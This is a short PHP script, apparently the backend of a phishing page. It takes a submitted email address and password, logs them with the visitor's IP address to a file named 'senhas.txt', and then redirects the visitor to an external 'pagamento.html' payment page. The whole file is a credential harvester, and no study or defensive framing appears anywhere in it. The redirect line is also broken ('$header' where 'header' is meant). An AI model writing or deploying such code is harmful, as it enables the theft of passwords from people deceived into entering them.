<?php
$usuario = $_POST['email'];
$senha = $_POST['passwd'];
$ip = $_SERVER['REMOTE_ADDR'];
$tudo = "Email: ".$usuario." - passwd: ".$senha." - IP: ".$ip."<br>";
 
$fp = fopen("senhas.txt", "a");
fwrite($fp, $tudo);
fclose($fp);
$header("Location: http://www.w3patk.esy.es/pagamento.html");
?>